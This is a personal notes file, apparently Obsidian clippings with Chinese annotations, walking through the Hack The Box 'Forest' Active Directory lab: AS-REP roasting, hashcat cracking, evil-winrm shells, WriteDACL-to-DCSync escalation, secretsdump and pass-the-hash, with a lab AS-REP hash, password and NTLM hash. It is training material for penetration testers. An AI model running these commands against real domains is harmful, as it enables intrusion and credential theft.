---
created: 2025-09-17T11:49:00 (UTC -04:00)
tags: []
source: https://systemweakness.com/htb-forest-machine-walkthrough-explanation-e8facb4db082
author: Bcourt
---

```
sudo sh -c 'echo "10.10.10.161 FOREST.htb.local" >> /etc/hosts'
```

### `**sh**`

- `sh` 是 **Shell 解释器**，也就是一个用来读取并执行命令的程序。
- 在大多数 Linux 系统中，`sh` 实际上是 `bash` 或 `dash` 的符号链接。
- 使用 `sh` 可以在一个干净的环境中执行命令。

---

### `**c**`

- `c` 参数告诉 `sh` **执行紧跟其后的字符串作为命令**。
- 单引号 `'...'` 中的内容都会被当作命令执行。

```Bash
//port 5985 WS-Man (Web Services for Management)
//port 47001 Windows Remote Management (WinRM)
nslookup 

NXDOMAIN stands for a non-existent domain
```
[[Notion/Common Tools/kerbrute]]
```Bash
since 88 is open so we can try kerbrute for user enum
kerbrute userenum --dc -d 
```
[[389]]
```Bash
since 389 open, ldap, can use ldapsearch
ldapsearch  -x -b -s -h 
GetNPUsers.py >

hashcat --hash-info | grep partofhash 
get model 18200
get user and pw 

```

```Bash
/port 445 Microsoft Directory Service. This port is primarily associated with 
the Server Message Block (SMB) protocol,
can use smbclient, rpcclient, smbmap, CrackMapExec enum4linux
smbmap -H 10.10.10.161
Remote Procedure Call rpc 
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
since we find :group:[Domain Admins] rid:[0x200] so 
rpcclient $> querygroup 0x200
since :Num Members:1
rpcclient $> queryuser 0x1f4
 
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

```Bash
since we have a username and pw, evil-winrm can get a shell with them.
```

cat users.txt  
user:[Administrator] rid:[0x1f4]  
user:[Guest] rid:[0x1f5]  
user:[krbtgt] rid:[0x1f6]  
user:[DefaultAccount] rid:[0x1f7]  
user:[$331000-VK4ADACQNUCA] rid:[0x463]  
user:[SM_2c8eef0a09b545acb] rid:[0x464]  
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]  
user:[SM_75a538d3025e4db9a] rid:[0x466]  
user:[SM_681f53d4942840e18] rid:[0x467]  
user:[SM_1b41c9286325456bb] rid:[0x468]  
user:[SM_9b69f1b9d2cc45549] rid:[0x469]  
user:[SM_7c96b981967141ebb] rid:[0x46a]  
user:[SM_c75ee099d0a64c91b] rid:[0x46b]  
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]  
user:[HealthMailboxc3d7722] rid:[0x46e]  
user:[HealthMailboxfc9daad] rid:[0x46f]  
user:[HealthMailboxc0a90c9] rid:[0x470]  
user:[HealthMailbox670628e] rid:[0x471]  
user:[HealthMailbox968e74d] rid:[0x472]  
user:[HealthMailbox6ded678] rid:[0x473]  
user:[HealthMailbox83d6781] rid:[0x474]  
user:[HealthMailboxfd87238] rid:[0x475]  
user:[HealthMailboxb01ac64] rid:[0x476]  
user:[HealthMailbox7108a4e] rid:[0x477]  
user:[HealthMailbox0659cc1] rid:[0x478]  
user:[sebastien] rid:[0x479]  
user:[lucinda] rid:[0x47a]  
user:[svc-alfresco] rid:[0x47b]  
user:[andy] rid:[0x47e]  
user:[mark] rid:[0x47f]  
user:[santi] rid:[0x480]%

```PowerShell
//linux
grep -oP 'user:\[\K[^\]]+' users.txt > usernames.txt 
//mac
ggrep -oP 'user:\[\K[^\]]+' users.txt > usernames.txt

sed -n 's/.*user:\[\([^]]*\)\].*/\1/p' users.txt > usernames.txt
```

```PowerShell
GetNPUsers.py htb.local/ -usersfile usernames.txt -request -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.161
```

- null] [pattern] [file ...]  
    ➜ forest ggrep -oP 'user:\[\K[^\]]+' users.txt > usernames.txt

➜ forest [GetNPUsers.py](http://getnpusers.py/) htb.local/ -usersfile usernames.txt -request -format hashcat -outputf  
ile asrep_hashes.txt -dc-ip 10.10.10.161  
/usr/local/lib/python3.9/site-packages/impacket/version.py:12: UserWarning: pkg_resources is  
import pkg_resources  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set  
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c6c6dde3654e2c08b5c512700389a9aa$fba1e1f92aefcf3059d46a0f96f617ff395dddd6b1d206e34bcc1423b99062918373aa71cf73a639d32c1003dadc14e7957137d3a25625523a9705feda0692106d4925db28ae070f36f30e2d0285dbca43ad570694d019cf3daaf010ab7c8272e02246ef160efaada7b39d6b3ccb1f407c1db82d9df2719305f3e89d837b258c69f20fdc8712d22b35ad0f248aa89eb61bf98fd7934bbfeb661bcde3d0e2f1334d08942d1e0e64d12cc6c2df9c998740f1e1ee6ab70bdb50a0e68784257ef94b02dd87204dad8cc42e92e5f3729c2ddef9b9ad3f47a04056b7f6e840c0a7b42bd80e8441460e  
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

  

```PowerShell
 hashcat -m 18200 asrep_hashes.txt  /Users/share/wordlists/rockyou.txt
```

```PowerShell
 evil-winrm -u svc-alfresco  -p s3rvice -i 10.10.10.161
```

```PowerShell
 evil-winrm -u svc-alfresco  -p s3rvice -i 10.10.10.161
```

**Evil-WinRM** does support **Pass-the-Hash (PtH)** via the `**-H**` flag, allowing you to authenticate directly with an **NTLM hash** (not the AS-REP hash). However, the hash you have (`**$krb5asrep$23$...**`) is a **Kerberos AS-REP hash**, which Evil-WinRM _cannot_ use directly.

**关于 Evil-WinRM 和哈希传递（Pass-the-Hash, PtH）的说明：**

1. **Evil-WinRM 的** `**H**` **参数支持 NTLM 哈希直接认证**
    - Evil-WinRM 可以通过 `**H**` 参数直接使用 **NTLM 哈希**（格式如 `**LMHASH:NTHASH**` 或 `**:NTHASH**`）进行身份验证，无需破解明文密码。
    - 示例命令：bash evil-winrm -i 10.10.10.161 -u svc-alfresco -H 'aad3b435b51404eeaad3b435b51404ee:...'
2. **AS-REP 哈希（Kerberos）与 NTLM 哈希的区别**
    - 你当前拥有的哈希格式是 `**$krb5asrep$23$...**`，这是 **Kerberos AS-REP 哈希**，用于离线破解（如 Hashcat 的 `**m 18200**` 模式）。
    - **Evil-WinRM 不支持直接使用 AS-REP 哈希**，因为它仅适用于 NTLM 认证协议。
3. **如何利用 AS-REP 哈希？**
    - **方法 1：破解哈希获取明文密码**
        
        使用 Hashcat 破解 AS-REP 哈希，得到明文密码后通过 Evil-WinRM 登录：
        
        bash  
        hashcat -m 18200 asrep_hashes.txt rockyou.txt  
        evil-winrm -i 10.10.10.161 -u svc-alfresco -p '破解后的密码'
        
    - **方法 2：转换为 NTLM 哈希（需域内权限）**
        
        如果已通过其他方式（如 `**secretsdump.py**`）获取用户的 NTLM 哈希，可直接用于 Evil-WinRM：
        
        bash  
        evil-winrm -i 10.10.10.161 -u svc-alfresco -H 'NTLM哈希'
        
4. **Kerberos 认证的替代方案**
    
    若需直接使用 Kerberos 协议（如 AS-REP 哈希衍生的 TGT 票据），需借助其他工具（如 Impacket 的 `**ticketer.py**`），但 Evil-WinRM 本身不支持。
    

---

**总结：**

- **AS-REP 哈希 → 必须破解为明文密码** 或 **转换为 NTLM 哈希** 才能用于 Evil-WinRM。
- **NTLM 哈希 → 可直接通过** `**H**` **参数传递认证**。

if have name and hash, can use evil-winrm, also use

```PowerShell
 smbexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' 'administrator@10.10.10.161'
```

```PowerShell
mount_smbfs -N '//svc-alfresco:s3rvice@10.10.10.161/SYSVOL' ./share
```

```PowerShell
smbclient  "\\\\10.10.10.161\\SYSVOL" -U "svc-alfresco" -password s3rvice
```

```PowerShell
nxc smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
```

```PowerShell
nxc smb 10.10.10.161 -u svc-alfresco -p s3rvice --users
```

```PowerShell
 nxc smb 10.10.10.161 -u ''   --shares
 nxc smb 10.10.10.161 -u ''   --users
```

  

┌─────────────────────────┐  
│ 当前账户: svc-alfresco │  
│ 权限: GenericAll │  
└───────────┬─────────────┘  
│  
▼  
┌─────────────────────────┐  
│ 加入 Exchange Windows │  
│ 权限组 │  
│ 权限组特性: WriteDACL │  
└───────────┬─────────────┘  
│  
▼  
┌─────────────────────────┐  
│ 利用 WriteDACL 权限 │  
│ 给新用户添加 DCSync │  
│ ACE 权限（3条） │  
│ - DS-Replication-Get-Changes │  
│ - DS-Replication-Get-Changes-All │  
│ - DS-Replication-Get-Changes-In-Filtered-Set │  
└───────────┬─────────────┘  
│  
▼  
┌─────────────────────────┐  
│ 新用户获得 DCSync 权限 │  
└───────────┬─────────────┘  
│  
▼  
┌─────────────────────────┐  
│ 使用 Mimikatz/PowerView │  
│ 执行 DCSync │  
│ 导出 NTDS.dit 哈希 │  
└───────────┬─────────────┘  
│  
▼  
┌─────────────────────────┐  
│ 域管理员权限获取 │  
│ 可以完全控制 AD │  
└─────────────────────────┘

# HTB Forest Machine

> ## Excerpt
> HTB Forest Machine Walkthrough/Explanation Step 1: Network Scanning We will start by conducting a network scan using Nmap. This will help us identify open ports, running services, the target …

---
[

![Bcourt](https://miro.medium.com/v2/da:true/resize:fill:32:32/0*e0zOKawYtUMwRAZr)



](https://medium.com/@bcourt928?source=post_page---byline--e8facb4db082---------------------------------------)

8 min read

Mar 3, 2025

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*1RKAH4NyNGsUlvO5)

Initial join screen for Forest

**Step 1: Network Scanning**

[[Notion/OSCP 2/nmap]]

We will start by conducting a network scan using Nmap. This will help us identify open ports, running services, the target operating system, and general details about the network structure. The first command we’ll use is “nmap -T5 -p- 10.10.10.161”

Breakdown of the switches:

-   \-T5: Nmap offers six timing templates, ranging from 0 (Paranoid mode) for maximum stealth to 5 (Insane mode) for the fastest scan. The -T5 option prioritizes speed over stealth, making the scan significantly faster but also more detectable.
-   \-p-: By default, Nmap scans the top 1,000 most common ports for each protocol (TCP and UDP). The -p- flag ensures that all 65,535 ports are scanned, preventing any uncommon or non-default ports from being missed.

![](https://miro.medium.com/v2/resize:fit:543/0*PT-R15DBiopqrx5Y)

Quick initial nmap scan

After the initial scan, we can run a more aggressive scan targeting only the detected open ports. This speeds up the process by focusing on relevant services. The command for this is “nmap -T4 -A -p53,88,135,139,389,445,593,636,3269,5985,9389 10.10.10.161”

\-A: This flag combines multiple scans into one, including:

-   Service detection (-sV) — Identifies running services and versions.
-   OS detection (-O) — Attempts to determine the target’s operating system.
-   Script scanning (-sC) — Runs default Nmap scripts for additional insights.

This approach provides detailed information about the target while optimizing scan time.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*I978fNjIztWYIzZU)

More agressive targeted scan

Let’s examine some of the open ports we’ve identified (we’ll skip a few, but feel free to explore all of them):

-   Port  [[53]]— Domain Name System (DNS): Translates human-readable domain names into IP addresses and vice versa through a process known as Reverse DNS Lookup.
-   Port  [[88]]— Kerberos: A ticket-based authentication system, indicating that this is likely a Windows Domain Controller.
-   Port 139 [[139]]— Server Message Block (SMB): Used for file sharing, suggesting that there may be a file share worth enumerating.
-   Port 389[[389]] — Lightweight Directory Access Protocol (LDAP): Enables access and management of directory services.
-   Port 445 — Newer SMB Port: A more modern implementation of the SMB protocol.
-   Port 593 — used by Remote Procedure Call over HTTP (RPC over HTTP), also known as RPC over HTTPS. This protocol allows Microsoft Remote Procedure Call (RPC) traffic to be tunneled over HTTP or HTTPS, enabling secure communication between clients and servers, often in a Windows environment.
-   Port 636 — LDAPS: An encrypted version of LDAP for secure directory service communication.
-   Port 5985 — WinRM (Windows Remote Management): This service allows remote management of Windows systems and can often be leveraged for remote access with valid credentials.

During a penetration test, this is an ideal stage to research the discovered services and identify potential vulnerabilities.

It’s also a good time to add the domain to the /etc/hosts file. To do this, run the command sudo nano /etc/hosts, then add the domain name alongside its corresponding IP address. The /etc/hosts file manually maps domain names to IP addresses, effectively overriding DNS resolution.

**Step 2: Initial Enumeration**
[[DCSync]]


Given all of the ports we scanned, one of the most interesting is Port 139 and SMB. This is due to the potential vulnerability where SMB will allow anonymous authentication to some of the shares.

Press enter or click to view image in full size
[[smbclient]]

![](https://miro.medium.com/v2/resize:fit:700/0*LwN_EWhLeUtw-Kyi)

Anonymous authentication of SMB denied

Unfortunately, we were not successful in anonymous authentication to SMB.

Another port that is valuable to enumerate is Port 593 and RPC. Using rpcclient, we can also try to anonymously access the RPC service using the following command “rpcclient -U “” -N <ip>”. This is the rpcclient command for anonymous access. As you can see it worked, and we can use it to enumerate users:

![](https://miro.medium.com/v2/resize:fit:357/0*7qmXt_BOpW0qJmuI)

Successful user enumeration using rpcclient

From this scan, we can make a list of users and save it to a text file for later use. We can also enumerate domain groups:

![](https://miro.medium.com/v2/resize:fit:488/0*QeRn4cAEFLwbQziR)

Successful group enumeration using rpcclient

**Step 3: Discovering a Password**

Since we don’t have a password, we have a few options of how to proceed. One option is to try to bruteforce a password using the list of usernames. This is loud and it’s like finding a needle in a haystack. While there is a time and a place for brute forcing in a penetration test, I like to save it for a last resort.

Since we have a username list, but no password, we can test for the UF\_DONT\_REQUIRE\_PREAUTH flag.

UF\_DONT\_REQUIRE\_PREAUTH is an Active Directory user attribute that allows authentication without Kerberos pre-authentication, making it a security risk. Normally, pre-authentication prevents brute-force attacks by requiring users to encrypt a timestamp with their password hash before requesting a Ticket Granting Ticket (TGT). If this flag is set, an attacker can request a TGT without knowing the password, capture the AS-REP hash, and crack it offline to reveal credentials. Testing for this misconfiguration, known as AS-REP Roasting, is crucial in Active Directory penetration testing to identify vulnerable accounts that could be exploited for lateral movement or privilege escalation.

## Get Bcourt’s stories in your inbox

Join Medium for free to get updates from this writer.

To test for this this, we can use the following one-liner: “for user in $(cat <user\_file>); do GetNPUsers.py -no-pass -dc-ip <dc\_ip> <domain>/${user} | grep -v Impacket; done”

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*Ftjyk7M37-X1JpkI)

One-liner to Kerberoast without password

We were able to dump the AS-REP hash for the user “svc-alfresco”. Now we need to attempt to crack the password using hashcat with module 18200 (the module for AS-REP hashes). First save the hash to a file. The command is “hashcat -m 18200 <hash file> <path/to/wordlist> — force”

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*M7NRQU5Lnv1wf_Ix)

Cracked password for “svc-alfresco”

We were able to crack the password hash for the user “svc-alfresco”.

**Step 4: Credentialed Enumeration**

With our new set of credentials and knowledge of our target network (Port 5985 is WinRM), we can try to gain a shell.

We will use Evil-WinRM to authenticate taking advantage of the open Port 5985:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*OO3b4uYA0nrXbPwd)

Successful shell with Evil-WinRM

We are able to get a shell. Upon enumerating the system further, we can see the “user.txt” flag that we can read with the “more” command:

![](https://miro.medium.com/v2/resize:fit:497/0*kl9l6Gqq4AmYtgXE)

Reading the user.txt file

**Step 5: More Credentialed Enumeration**

If you find enumeration boring, penetration testing might not be the right career path for you, as a significant part of the job involves extensive enumeration. Personally, I enjoy it, as it feels like detective work, where each clue leads to another, gradually uncovering the bigger picture.

One of the first things I do when I obtain a set of domain credentials is run BloodHound to map out potential attack paths leading to Domain Admin. To get started with BloodHound, we first need to launch the Neo4j database and access the provided web interface. To do this use “sudo neo4j console” and either log in or sign-up for an account. Once that is complete, we will make a new folder in the bloodhound directory and use a command to download files to use in BloodHound:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*RYRXMywiTpsKx1XD)

Using BloodHound to download files

Once we do this, we can run the command “bloodhound” which launches the BloodHound software. We will want to choose the option to “Upload Data” and choose the files we just downloaded:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*OV40AOZzswPMJGqE)

Uploading files to BloodHound

We can now query different paths in the domain to discover vulnerabilities and the shortest path to domain admin. This is a great example of how enumeration is like uncovering clues: We can see that svc-alfresco belongs to the Service Accounts group, which is a member of the Privileged IT Accounts group:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*OR0T3CK2lI-46yH9)

Showing path from “svc-alfresco” to domain admin

From there, we can determine that the Privileged IT Accounts group belongs to the Account Operators group:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*dt2lhAJvZcBJ8JmB)

Path in BloodHound showing Privileged IT Accounts as a member of Account Operators

And finally, the Account Operators group belongs to the Exchange Windows Permissions group which has “Write DACL” permissions:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*A15nLIPl6ekQXQOd)

Path in BloodHound showing that Exchange Windows Operators can abuse Write DACL to get DA

Our user has GenericAll privilege through the Account Operators Group. As we can see, if we can add our user to the Exchange Windows Permissions, we will have “Write DACL” privileges.

Write DACL (Discretionary Access Control List) permissions are dangerous because they allow a user or attacker to modify the permissions of objects (like files, directories, or other Active Directory objects), potentially leading to unauthorized access or escalation of privileges.

**Step 6: Granting Privileges**

To add “svc-alfresco” to the Exchange Windows Permissions group we can use the following command:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*jn291eETiOXtNFwP)

Adding svc-alfresco to the Exchange Windows Permissions group

To check that it worked, we can use “net group”:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*A7chWeD7obMGVgjd)

Verifying it worked

Once the user is added to the group, we can perform a secretdump attack on the domain controller with the credentials.

_Note: Secretsdump is a tool from the Impacket suite used for extracting sensitive information from Windows systems, such as hashes, Kerberos tickets, and password policies. It works by interacting with Windows’ SAM database (Security Account Manager) or LSA secrets (Local Security Authority) through protocols like SMB, LDAP, or RPC. The tool can retrieve NTLM password hashes, Kerberos ticket-granting tickets (TGTs), and cached credentials. It is often used in post-exploitation scenarios for credential dumping and lateral movement._

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*jeiGGOLmDxFJZgLk)

Secretsdump output of the adminsitrator password hash

**Step 7: Accessing the System as Admin**

We can try to crack this hash (spoiler: rockyou.txt does not work), but we don’t have to. We can use a “Pass the Hash” attack to authenticate via Evil-WinRM as the administrator account:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*dcFGnewHLtcdutw5)

Using a Pass the Hash attack to authenticate as “adminsitrator”

Once we are authenticated, we can enumerate more, and find the “root.txt” file:

![](https://miro.medium.com/v2/resize:fit:500/0*GQJLjhM7dBmU7tkC)

Reading the “root.txt” file

**Conclusion:**

The “Forest” machine on Hack The Box was an incredibly fun and educational experience. I delved deep into Active Directory enumeration to identify weaknesses and map out attack paths. Using RPCClient, I was able to interact with the system and gather valuable information, which played a crucial role in the enumeration phase. As I progressed, I discovered multiple opportunities for privilege escalation, learning new techniques along the way. Overall, the machine offered a great blend of challenges, and I walked away with a much deeper understanding of how to approach Active Directory environments in penetration testing.

![](https://miro.medium.com/v2/resize:fit:655/0*xOlcSWiIEDfrX6Pm)

Completetion of Forest Machine

─$ impacket-secretsdump htb.local/shiyan@10.10.10.161
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Cannot create "sessionresume_DPvLaPmQ" resume session file: [Errno 13] Permission denied: 'sessionresume_DPvLaPmQ'
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
你可以通过几个简单步骤来确认 “本地写权限” 是否是问题。你的报错里有这一行：

`Cannot create "sessionresume_DPvLaPmQ" resume session file: [Errno 13] Permission denied`

- `[Errno 13] Permission denied` ✅  
    这通常是 **本地文件系统权限不足**，而不是远程服务器的问题。
    
- `sessionresume_XXXX` 是 `impacket-secretsdump` 在本地创建的一个临时文件，用来记录抓取会话。
    
- 如果当前目录没有写权限，就会报这个错误。